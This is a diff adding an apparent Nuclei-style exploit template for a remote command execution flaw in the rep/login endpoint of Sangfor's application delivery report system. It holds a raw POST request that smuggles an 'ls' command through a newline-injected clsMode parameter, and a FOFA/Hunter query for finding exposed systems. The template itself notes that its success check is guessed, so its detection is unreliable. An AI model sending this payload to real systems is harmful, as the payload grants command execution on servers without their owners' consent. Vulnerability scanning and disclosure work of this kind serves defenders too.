@@ -1,0 +1,36 @@
+id: poc-3dd19420e0b8462c5469
+info:
+  name: 深信服应用交付管理系统rep_login远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3dd19420e0b8462c5469dcb1f613be4a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 3dd19420e0b8462c5469dcb1f613be4a
+    fofa: + hunter`app.name="SANGFOR 深信服应用交付报表系统"`
+http:
+- raw:
+  - 'POST /rep/login HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-type: application/x-www-form-urlencoded
+
+    Content-Length: 118
+
+
+    clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
